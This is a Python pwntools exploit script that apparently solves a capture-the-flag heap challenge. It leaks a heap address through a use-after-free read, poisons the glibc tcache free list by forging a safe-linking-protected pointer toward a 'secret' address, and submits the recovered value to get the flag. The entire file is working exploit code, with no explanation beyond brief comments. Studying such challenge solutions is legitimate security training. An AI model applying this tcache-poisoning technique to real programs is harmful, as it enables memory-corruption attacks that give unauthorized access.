#!/bin/python

from pwn import * 
import sys

context.arch = 'amd64'

FIRST_BIN_OFFSET = 0x2c0


def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"scanf")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"puts")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


def tcache_get_two_entries(bin):
    malloc(14, bin)
    malloc(15, bin)
    free(15)
    free(14)


def get_addr_num(addr: bytes):
    return u64(addr.ljust(8, b'\x00'))


proc = process(sys.argv[1])
proc.recvuntil(b"secret stored at ")
secret_addr = int(proc.recvline(drop=True)[:-1], 16)

size = 8
malloc(0, size)
free(0)

# (offset not needed)
first_malloc_addr = get_addr_num(puts(0))
print("[$] first_malloc_addr: " + hex(first_malloc_addr))

tcache_get_two_entries(size)
proted_secret = secret_addr ^ (first_malloc_addr)
scanf(0, p64(proted_secret))
malloc(0, size)
#malloc gets discarded and zeroes out the last 8 bytes
malloc(0, size)

malloc(0, size)
free(0)
try:
    first_half = (get_addr_num(puts(0)[:8]) ^ first_malloc_addr) ^ (secret_addr >> 12)
except:
    print("Null bytes from puts for first half...")
    exit(0)

proc.sendline(b"send_flag")
proc.sendline(p64(first_half) + p64(0))

proc.interactive()
